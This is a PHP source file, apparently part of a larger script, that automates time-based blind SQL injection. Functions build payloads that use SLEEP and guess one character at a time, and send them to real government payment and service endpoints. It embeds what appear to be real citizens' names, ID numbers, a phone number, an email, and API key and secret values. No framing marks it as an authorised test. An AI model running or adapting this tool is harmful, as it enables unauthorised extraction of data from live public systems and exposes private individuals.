        CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060'%2b" . $injection . "%2b'&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.phpp&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
        // CURLOPT_POSTFIELDS => "amountExpected=550&apiClientID=4&billDesc=Vehicle%20Inquiry&billRefNumber=TIMS-MVR-10374947&callBackURLOnFail=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpayFail.htm&callBackURLOnSuccess=https%3A%2F%2Ftims.ntsa.go.ke%2Fpay%2FpaySuccess.htm%3ForderNo%3D10374947%26callBackURLOnSuccess%3D%252Fportal%252FpublicQuery%252Fvehicle%252FqueryVehicle.htm%253FregistrationNo%253DKAR040A&clientEmail=&clientIDNumber=30945371&clientMSISDN=%2B254793060" . $injection . "%2b'&clientName=TIMONA%20MBURU%20WAMBUI&currency=KES&key=6678979C75A70BDA85762F4D488AFB6F&notificationURL=https%3a%2f%2fukrzmi.com%2flab.phpp&pictureURL=https%3A%2F%2Ftims.ntsa.go.ke%2Fimages%2FuserPay.png&secret=C26C64040DBEE49500013CBCFEC42541&secureHash=ZmRiODg0NDZhNDIwMzI1MDExZDM0Zjk4NjMzOTMwYmQ1MDlmNjUwMjA3MDQ0MmFkNjhmMDMyODM2YTlmYmMwMQ%3D%3D&serviceID=46",
        // CURLOPT_POSTFIELDS => "amountExpected=250.00&apiClientID=1&billDesc=OFFICIAL%20SEARCH%20(%22CR13%22)&billRefNumber=4MXRN9&callBackURLOnFail=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Ffailed&callBackURLOnSuccess=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fpayments%2F4MXRN9%2Fcallback%2Fsuccess&clientEmail=Waroruaalex640%40gmail.com&clientIDNumber=39290974&clientMSISDN=%2B254793060" . $injection . "%2b'&clientName=ALEX%20WANG\'ANG\'A%20WARORUA&clientType=1&currency=KES&notificationURL=https%3A%2F%2Fbrs.ecitizen.go.ke%2Fapi%2Fpayments%2Fpesaflow-ipn&secureHash=NzM0ODk3NWMwMDlhOTUyYTMxYmVmMDRiZDQ2ODc3Y2ZiZDg4YmJlMDBlMzMwZTcxZmRlZmMzNWRhZWJhNWYzMA%3D%3D&serviceID=39",

        CURLOPT_HTTPHEADER => array(
            'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'DNT: 1',
            'Upgrade-Insecure-Requests: 1',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site: cross-site',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Dest: iframe',
            'host: kever.io'
        ),
    ));

    // Set the cURL timeout
    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);

    // Execute the cURL request
    $response = curl_exec($curl);

    // Check for cURL errors and the execution time
    $curlError = curl_error($curl);
    $curlInfo = curl_getinfo($curl);

    // Close the cURL session
    curl_close($curl);

    $i = [
        'message' => $i,
    ];
    // Check if the request timed out
    if ($curlInfo['total_time'] >= 5) {
        if ($state['id'] == 1) {
            echo "result:" . $i['message'];
            exit; // Terminate the script
        } elseif ($state['id'] == 2) {
            if (is_array($i)) {

                $stateObject = base64_encode(json_encode($state));

                if (!isset($state['statecode'])) {
                    $stateCode = base64_encode(json_encode([$i['message']]));
                } else {
                    $stc_a = json_decode(base64_decode($state['statecode']), true);
                    //$stc_a['statecode']
                    array_push($stc_a, $i['message']);
                    $stateCode = base64_encode(json_encode($stc_a));
                    //$state['stateCode'] = '';
                }
                sql_verif($stateCode, $stateObject);

                exit('The script touched exit!'); // Terminate the script
            } else {
                echo "Variable [i] should be an array with state 2!";
                exit; // Terminate the script
            }
        } else {
            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
            exit; // Terminate the script
        }
    } else {
        //echo "Script ended. Last parameter: " . $i.'<BR/>'.PHP_EOL;
    }

    // Handle other possible errors or process the response as needed
    if ($curlError) {
        echo "cURL Error: " . $curlError;
        exit; // Terminate the script
    }

    // Process the response as needed
    // ...
}

function kotnova_b($injection, $i, $sleep_timer, $state)
{
    $injection = str_replace(' ', '%20', $injection);
    $sleep_a = $sleep_timer + 1;
    $sleep_b = $sleep_a * 1000;
    //$curl = curl_init();
    global $curl;
    curl_setopt_array($curl, array(
        CURLOPT_URL => "https://kever.io/sql.php?local=1&query=Africa'%2b" . $injection . "%2b'",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
        CURLOPT_HTTPHEADER => array(
            'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'DNT: 1',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site: none',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-User: ?1',
            'Sec-Fetch-Dest: document',
            'host: kever.io'
        ),
    ));

    // Set the cURL timeout
    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);

    // Execute the cURL request
    $response = curl_exec($curl);

    // Check for cURL errors and the execution time
    $curlError = curl_error($curl);
    $curlInfo = curl_getinfo($curl);

    // Close the cURL session
    curl_close($curl);

    $i = [
        'message' => $i,
    ];
    // Check if the request timed out
    if ($curlInfo['total_time'] >= 5) {
        if ($state['id'] == 1) {
            echo "result:" . $i['message'];
            exit; // Terminate the script
        } elseif ($state['id'] == 2) {
            if (is_array($i)) {

                $stateObject = base64_encode(json_encode($state));

                if (!isset($state['statecode'])) {
                    $stateCode = base64_encode(json_encode([$i['message']]));
                } else {
                    $stc_a = json_decode(base64_decode($state['statecode']), true);
                    //$stc_a['statecode']
                    array_push($stc_a, $i['message']);
                    $stateCode = base64_encode(json_encode($stc_a));
                    //$state['stateCode'] = '';
                }
                sql_verif($stateCode, $stateObject);
                // httpGet('https://localhost/kever/' . $state['page'], ['statecode' => $stateCode, 'stateobject' => $stateObject]);
                //header('location: ' . $state['page'] . '?statecode=' . $stateCode . '&stateobject=' . $stateObject);
                //echo "result:" . $i['message'];
                exit('The script touched exit!'); // Terminate the script
            } else {
                echo "Variable [i] should be an array with state 2!";
                exit; // Terminate the script
            }
        } else {
            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
            exit; // Terminate the script
        }
    } else {
        //echo "Script ended. Last parameter: " . $i.'<BR/>'.PHP_EOL;
    }

    // Handle other possible errors or process the response as needed
    if ($curlError) {
        echo "cURL Error: " . $curlError;
        exit; // Terminate the script
    }

    // Process the response as needed
    // ...
}

function nrs_b($injection, $i, $sleep_timer, $state)
{
    $injection = str_replace(' ', '%20', $injection);
    $sleep_a = $sleep_timer + 1;
    $sleep_b = $sleep_a * 1000;
    // $curl = curl_init();
    global $curl;
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => '{
            "mpesadetails": {
                "FirstName": "John",
                "BillRefNumber": "INVXX",
                "TransAmount": "0",
                "TransChannel": "mpesa",
                "TransID":"SB5662FDXC' . "'" . '+' . $injection . '+' . "'" . '",
            }
        }',
        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/x-www-form-urlencoded',
            'host: nairobiservices.go.ke'
        ),
    ));

    // Set the cURL timeout
    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);

    // Execute the cURL request
    $response = curl_exec($curl);

    // Check for cURL errors and the execution time
    $curlError = curl_error($curl);
    $curlInfo = curl_getinfo($curl);

    // Close the cURL session
    curl_close($curl);

    $i = [
        'message' => $i,
    ];
    // Check if the request timed out
    if ($curlInfo['total_time'] >= 5) {
        if ($state['id'] == 1) {
            echo "result:" . $i['message'];
            exit; // Terminate the script
        } elseif ($state['id'] == 2) {
            if (is_array($i)) {

                $stateObject = base64_encode(json_encode($state));

                if (!isset($state['statecode'])) {
                    $stateCode = base64_encode(json_encode([$i['message']]));
                } else {
                    $stc_a = json_decode(base64_decode($state['statecode']), true);
                    //$stc_a['statecode']
                    array_push($stc_a, $i['message']);
                    $stateCode = base64_encode(json_encode($stc_a));
                    //$state['stateCode'] = '';
                }
                sql_verif($stateCode, $stateObject);

                exit('The script touched exit!'); // Terminate the script
            } else {
                echo "Variable [i] should be an array with state 2!";
                exit; // Terminate the script
            }
        } else {
            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
            exit; // Terminate the script
        }
    } else {
        //echo "Script ended. Last parameter: " . $i.'<BR/>'.PHP_EOL;
    }

    // Handle other possible errors or process the response as needed
    if ($curlError) {
        echo "cURL Error: " . $curlError;
        exit; // Terminate the script
    }

    // Process the response as needed
    // ...
}

function nrs($injection, $i, $sleep_timer, $state)
{
   // $injection = str_replace(' ', ' ', $injection);
    $sleep_a = $sleep_timer + 1;
    $sleep_b = $sleep_a * 1000;
    $injk = "SB5662FDXC'+".$injection."+'";
    //echo $injk.'<br/>';
    // $curl = curl_init();
    global $curl;
    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => $sleep_a, // Set the cURL timeout to 5 seconds
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => '{
            "mpesadetails":{
                "BillRefNumber":"BL-SE-XXXX",
                "TransAmount":0,
                "TransID":"'.$injk.'",
                "MSISDN":"2547",
                "FirstName":"John Doe",
                "token":"122"
            }
        }',
        CURLOPT_HTTPHEADER => array(
            'Content-Type: application/json',
            'host: nairobiservices.go.ke'
        ),
    ));

    // Set the cURL timeout
    curl_setopt($curl, CURLOPT_TIMEOUT_MS, $sleep_b);

    // Execute the cURL request
    $response = curl_exec($curl);
    //echo $response.'<br/>';

    // Check for cURL errors and the execution time
    $curlError = curl_error($curl);
    $curlInfo = curl_getinfo($curl);
    //echo $response;
    // Close the cURL session
    curl_close($curl);

    $i = [
        'message' => $i,
    ];
    // Check if the request timed out
    if ($curlInfo['total_time'] >= 5) {
        if ($state['id'] == 1) {
            echo "result:" . $i['message'];
            exit; // Terminate the script
        } elseif ($state['id'] == 2) {
            if (is_array($i)) {

                $stateObject = base64_encode(json_encode($state));

                if (!isset($state['statecode'])) {
                    $stateCode = base64_encode(json_encode([$i['message']]));
                } else {
                    $stc_a = json_decode(base64_decode($state['statecode']), true);
                    //$stc_a['statecode']
                    array_push($stc_a, $i['message']);
                    $stateCode = base64_encode(json_encode($stc_a));
                    //$state['stateCode'] = '';
                }
                sql_verif($stateCode, $stateObject);

                exit('The script touched exit!'); // Terminate the script
            } else {
                echo "Variable [i] should be an array with state 2!";
                exit; // Terminate the script
            }
        } else {
            echo "Unknown variable [i].Should be either 1[a string] or 2[an array]!";
            exit; // Terminate the script
        }
    } else {
        //echo "Script ended. Last parameter: " . $i.'<BR/>'.PHP_EOL;
       // echo "Script ended. Last parameter: " . ''.'<BR/>'.PHP_EOL;
    }

    // Handle other possible errors or process the response as needed
    if ($curlError) {
        echo "cURL Error: " . $curlError;
        exit; // Terminate the script
    }

    // Process the response as needed
    // ...
}

function length_finder($sleep_timer, $target, $parameter, $state)
{
    for ($i = 0; $i <= 200; $i++) {

        $injection = "(SELECT(IF(LENGTH(" . $parameter . ")=" . $i . ",SLEEP(" . $sleep_timer . "),1)))";
        //sample inject: SELECT LENGTH((SELECT TABLE_NAME FROM information_schema.tables WHERE table_schema = 'tsavosit_collo' ORDER BY TABLE_NAME LIMIT 1)) AS table_name_length;
        //$injection = "(SELECT IFNULL((SELECT(SLEEP(" . $sleep_timer . "))FROM DUAL WHERE (" . $parameter . ")=" . $i . "),'Db not found or does not contain 14 tables'))";
        //$injection = "(SELECT(IF(LENGTH(SYSTEM_USER())=" . $i . ",SLEEP(5),1)))";
        if ($target == 1) {
            $result = pesaflow($injection, $i, $sleep_timer, $state);
        } elseif ($target == 2) {
            $result = kotnova($injection, $i, $sleep_timer, $state);
        } elseif ($target == 3) {
            $result = nrs($injection, $i, $sleep_timer, $state);
        }
    }
    return $result;
}

function custom_code($sleep_timer, $target, $query, $i, $hex, $state)
{

    $injection = $query;
    //$injection = "(SELECT(IF((1=1," . $query . ",1)))";
    //$injection = "(SELECT(IF((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema='tsavosit_faith'))=0,SLEEP(5),1)))";
    //$injection = "(SELECT(IF((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema='tsavosit_collo'))=14,SLEEP(5),1)));";
    //$injection = "(SELECT(IF((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema=".$hex."))".$query.",SLEEP(" . $sleep_timer . "),1)))";
    //$injection = "(SELECT(IF(LENGTH(SYSTEM_USER())=" . $i . ",SLEEP(5),1)))";
    if ($target == 1) {
        $result = pesaflow($injection, $i, $sleep_timer, $state);
    } elseif ($target == 2) {
        $result = kotnova($injection, $i, $sleep_timer, $state);
    }
    if ($result == '' || $result = null) {
        return 'STATUS NULL';
    } else {
        return $result;
    }
}

function count_checker($sleep_timer, $target, $query, $i, $hex, $state)
{

    $injection = "(SELECT(IF(" . $query . ",SLEEP(" . $sleep_timer . "),1)))";
    //$injection = "(SELECT(IF((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema='tsavosit_faith'))=0,SLEEP(5),1)))";
    //$injection = "(SELECT(IF((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema='tsavosit_collo'))=14,SLEEP(5),1)));";
    //$injection = "(SELECT(IF((SELECT(COUNT(*))FROM(information_schema.tables)WHERE(table_schema=".$hex."))".$query.",SLEEP(" . $sleep_timer . "),1)))";
    //$injection = "(SELECT(IF(LENGTH(SYSTEM_USER())=" . $i . ",SLEEP(5),1)))";
    if ($target == 1) {
        $result = pesaflow($injection, $i, $sleep_timer, $state);
    } elseif ($target == 2) {
        $result = kotnova($injection, $i, $sleep_timer, $state);
    } elseif ($target == 3) {
        $result = nrs($injection, $i, $sleep_timer, $state);
    }

    if ($result == '' || $result = null) {
        return 'STATUS NULL';
    } else {
        return $result;
    }
}

function cr_1($position, $parameter, $target, $sleep_timer, $state)
{
    for ($i = 48; $i <= 57; $i++) {
        //$sleep_timer = 5;
        $injection = "(SELECT(IF(ASCII(SUBSTRING(" . $parameter . "," . $position . ",1))=" . $i . ",SLEEP(" . $sleep_timer . "),1)))";
        if ($target == 1) {
            $result = pesaflow($injection, $i, $sleep_timer, $state);
        } elseif ($target == 2) {
            $result = kotnova($injection, $i, $sleep_timer, $state);
        } elseif ($target == 3) {
            $result = nrs($injection, $i, $sleep_timer, $state);
        }
    }
    if ($result == '' || $result == null) {
        return 'NO';
    } else {
        return 'Found:' . $result;
    }
}

function cr_2($position, $parameter, $target, $sleep_timer, $state)
{
    for ($i = 65; $i <= 90; $i++) {
        // $sleep_timer = 5;
        $injection = "(SELECT(IF(ASCII(SUBSTRING(" . $parameter . "," . $position . ",1))=" . $i . ",SLEEP(" . $sleep_timer . "),1)))";
        if ($target == 1) {
            $result = pesaflow($injection, $i, $sleep_timer, $state);
        } elseif ($target == 2) {
            $result = kotnova($injection, $i, $sleep_timer, $state);
        } elseif ($target == 3) {
            $result = nrs($injection, $i, $sleep_timer, $state);
        }
    }
    if ($result == '' || $result == null) {
        return 'NO';
    } else {
        return 'Found:' . $result;
    }
}

function cr_3($position, $parameter, $target, $sleep_timer, $state)
{
    for ($i = 97; $i <= 122; $i++) {
        //$sleep_timer = 5;
        $injection = "(SELECT(IF(ASCII(SUBSTRING(" . $parameter . "," . $position . ",1))=" . $i . ",SLEEP(" . $sleep_timer . "),1)))";
        if ($target == 1) {
            $result = pesaflow($injection, $i, $sleep_timer, $state);
        } elseif ($target == 2) {
            $result = kotnova($injection, $i, $sleep_timer, $state);
        } elseif ($target == 3) {
            $result = nrs($injection, $i, $sleep_timer, $state);
        }
    }
    if ($result == '' || $result == null) {
        return 'NO';
    } else {
        return 'Found:' . $result;
    }
}

function cr_4($position, $parameter, $target, $sleep_timer, $state)
{
    //, 45, 47, 46, 58, 37, 59
    $chs = [95, 36, 45, 47, 46, 58, 37, 59];
    foreach ($chs as $i) {
        // $sleep_timer = 5;
        $injection = "(SELECT(IF(ASCII(SUBSTRING(" . $parameter . "," . $position . ",1))=" . $i . ",SLEEP(" . $sleep_timer . "),1)))";
        if ($target == 1) {
            $result = pesaflow($injection, $i, $sleep_timer, $state);
        } elseif ($target == 2) {
            $result = kotnova($injection, $i, $sleep_timer, $state);
        } elseif ($target == 3) {
            $result = nrs($injection, $i, $sleep_timer, $state);
        }
        if ($result == '' || $result == null) {
            return 'NO';
        } else {
            return 'Found:' . $result;
            break;
        }
    }
}

function cr_5($position, $parameter, $target, $sleep_timer, $state)
{
    $chs = array_merge(range(33, 47), [58, 59, 60, 61, 62, 63, 64, 91, 92, 93, 94, 96, 123, 124, 125, 126, 127]);;
    foreach ($chs as $i) {
        // $sleep_timer = 5;
        $injection = "(SELECT(IF(ASCII(SUBSTRING(" . $parameter . "," . $position . ",1))=" . $i . ",SLEEP(" . $sleep_timer . "),1)))";
        if ($target == 1) {
            $result = pesaflow($injection, $i, $sleep_timer, $state);
        } elseif ($target == 2) {
            $result = kotnova($injection, $i, $sleep_timer, $state);
        } elseif ($target == 3) {
            $result = nrs($injection, $i, $sleep_timer, $state);
        }
        if ($result == '' || $result == null) {
            return 'NO';
        } else {
            return 'Found:' . $result;
            break;
        }
    }
}

function cr_6($position, $parameter, $target, $sleep_timer, $state)
{
    for ($i = 32; $i <= 127; $i++) {
        //$sleep_timer = 5;
        $injection = "(SELECT(IF(ASCII(SUBSTRING(" . $parameter . "," . $position . ",1))=" . $i . ",SLEEP(" . $sleep_timer . "),1)))";
        if ($target == 1) {
            $result = pesaflow($injection, $i, $sleep_timer, $state);
        } elseif ($target == 2) {
            $result = kotnova($injection, $i, $sleep_timer, $state);
        } elseif ($target == 3) {
            $result = nrs($injection, $i, $sleep_timer, $state);
        }
    }
    if ($result == '' || $result == null) {
        return 'NO';
    } else {
        return 'Found:' . $result;
    }
}

function cr_7($position, $parameter, $target, $sleep_timer, $state)
{
    for ($i = 0; $i <= 33; $i++) {
        //$sleep_timer = 5;
        $injection = "(SELECT(IF(ASCII(SUBSTRING(" . $parameter . "," . $position . ",1))=" . $i . ",SLEEP(" . $sleep_timer . "),1)))";
        if ($target == 1) {
            $result = pesaflow($injection, $i, $sleep_timer, $state);
        } elseif ($target == 2) {
            $result = kotnova($injection, $i, $sleep_timer, $state);
        } elseif ($target == 3) {
            $result = nrs($injection, $i, $sleep_timer, $state);
        }
    }
    if ($result == '' || $result == null) {
        return 'NO';
    } else {
        return 'Found:' . $result;
    }
}

function character_finder($position, $parameter, $target, $sleep_timer, $state)
{
    if ($cr4 = cr_4($position, $parameter, $target, $sleep_timer, $state) != 'NO') {
        return $cr4;
    } elseif ($cr1 = cr_1($position, $parameter, $target, $sleep_timer, $state) != 'NO') {
        return $cr1;
    } elseif ($cr3 = cr_3($position, $parameter, $target, $sleep_timer, $state) != 'NO') {
        return $cr3;
    } elseif ($cr2 = cr_2($position, $parameter, $target, $sleep_timer, $state) != 'NO') {
        return $cr2;
    } else {
        return 'F1: No result(' . $position . ')<br/>';
    }
}



function character_finder2($position, $parameter, $target, $sleep_timer, $state)
{
    //*
    if ($cr6 = cr_6($position, $parameter, $target, $sleep_timer, $state) != 'NO') {
        return $cr6;
    } else {
        return 'F2: No result';
    }
    //*/
}

function character_finder_special($position, $parameter, $target, $sleep_timer, $state)
{
    if ($cr7 = cr_7($position, $parameter, $target, $sleep_timer, $state) != 'NO') {
        return $cr7;
    } else {
        return 'FS: No result';
    }
}

function character_finder_punctuation($position, $parameter, $target, $sleep_timer, $state)
{
    if ($cr5 = cr_5($position, $parameter, $target, $sleep_timer, $state) != 'NO') {
        return $cr5;
    } else {
        return 'FP: No result';
    }
}

function asciiToCharacter($decimal)
{
    return chr($decimal);
}

function startsWith($word, $start)
{
    return substr($word, 0, strlen($start)) === $start;
}
